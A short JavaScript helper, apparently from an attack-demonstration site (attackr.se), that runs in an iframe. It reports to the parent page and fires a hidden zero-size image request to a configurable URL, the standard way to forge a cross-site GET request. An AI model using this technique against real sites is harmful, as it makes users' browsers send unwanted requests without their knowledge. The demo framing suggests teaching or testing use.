if(!IFRAME_ID) { console.log("Warning! No iframe id set."); var IFRAME_ID = ""; }
if(!GET_SRC) { console.log("Warning! No src to GET set."); var GET_SRC = ""; }
var IFRAME_GETTER = {};
IFRAME_GETTER.haveGotten = false;
IFRAME_GETTER.reportAndGet = function() {
    var imgElement;
    if(parent != undefined) {
        parent.postMessage(IFRAME_ID, "https://attackr.se:8444");
    }
    if(!IFRAME_GETTER.haveGotten) {
        imgElement = document.createElement("img");
        imgElement.setAttribute("src", GET_SRC);
        imgElement.setAttribute("height", "0");
        imgElement.setAttribute("width", "0");
        imgElement.setAttribute("onerror", "javascript:clearInterval(IFRAME_GETTER.intervalId)");
        document.body.appendChild(imgElement);
        IFRAME_GETTER.haveGotten = true;
    }
};
IFRAME_GETTER.onLoad = function() {
    IFRAME_GETTER.intervalId = setInterval(IFRAME_GETTER.reportAndGet, 1000);
};
